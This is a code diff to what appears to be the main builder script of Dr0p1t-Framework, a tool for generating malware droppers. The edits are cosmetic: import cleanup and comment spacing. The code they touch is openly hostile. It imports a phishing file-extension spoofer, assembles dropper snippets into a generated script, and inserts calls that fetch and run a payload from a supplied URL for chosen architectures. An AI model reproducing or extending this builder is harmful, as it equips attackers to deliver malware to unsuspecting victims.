@@ -1,10 +1,16 @@
 #!/usr/bin/python3
 # Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
 from core.banners import random_banner as banner
-from core.color import *
-from core.Phishing import *
+from core.color import colored_print, print_status, warn
+from core.Phishing import Spoof_extension
 from core import updater
-import argparse, os, textwrap, sys, subprocess, shutil, random
+import argparse
+import os
+import textwrap
+import sys
+import subprocess
+import shutil
+import random
 
 parser = argparse.ArgumentParser(
     usage=argparse.SUPPRESS,
@@ -113,7 +119,7 @@ def PyInstaller():
 
 def get_code(f):
     code = open(f, "r").read()
-    return "\n" + code.split("#Start")[1]
+    return "\n" + code.split("# Start")[1]
 
 
 def make_copy(old, new):
@@ -188,8 +194,8 @@ def main():
     f += 'import subprocess\n'
 
     f += get_code(os.path.join(p, "pre_run.py")) + "\n"
-    #this functions for :
-    #get_output(cmd): to get output of command without using pipe to escape the fatal error after compiling !!
+    # this functions for :
+    # get_output(cmd): to get output of command without using pipe to escape the fatal error after compiling !!
 
     if args.k:
         if not args.nd:
@@ -208,36 +214,36 @@ def main():
         if args.zip:
             f += get_code(os.path.join(p, "dropper.py")).replace(
                 "##~Import-Here~##",
-                "import zipfile").split("#Someshit")[0] + "\n"
+                "import zipfile").split("# Someshit")[0] + "\n"
             f += '\nfire_things_up("{}","32",True)\n'.format(url)
         else:
-            f += get_code(os.path.join(p, "dropper.py")).split("#Someshit")[0]
+            f += get_code(os.path.join(p, "dropper.py")).split("# Someshit")[0]
             f += '\nfire_things_up("{}","32")\n'.format(url)
 
     elif args.only64:
         if args.zip:
             f += get_code(os.path.join(p, "dropper.py")).replace(
                 "##~Import-Here~##",
-                "import zipfile").split("#Someshit")[0] + "\n"
+                "import zipfile").split("# Someshit")[0] + "\n"
             f += '\nfire_things_up("{}","64",True)\n'.format(url)
         else:
-            f += get_code(os.path.join(p, "dropper.py")).split("#Someshit")[0]
+            f += get_code(os.path.join(p, "dropper.py")).split("# Someshit")[0]
             f += '\nfire_things_up("{}","64")\n'.format(url)
 
     elif not args.only32 or not args.only64:
         if args.zip:
             f += get_code(os.path.join(p, "dropper.py")).replace(
                 "##~Import-Here~##",
-                "import zipfile").split("#Someshit")[0] + "\n"
+                "import zipfile").split("# Someshit")[0] + "\n"
             f += '\nfire_things_up("{}",False,True)\n'.format(url)
         else:
-            f += get_code(os.path.join(p, "dropper.py")).split("#Someshit")[0]
+            f += get_code(os.path.join(p, "dropper.py")).split("# Someshit")[0]
             f += '\nfire_things_up("{}")\n'.format(url)
 
     if args.runas:
         f += get_code(os.path.join(p, "runas.py"))
     else:
-        f += get_code(os.path.join(p, "dropper.py")).split("#Someshit")[1]
+        f += get_code(os.path.join(p, "dropper.py")).split("# Someshit")[1]
 
     if args.s:
         if not args.nd:
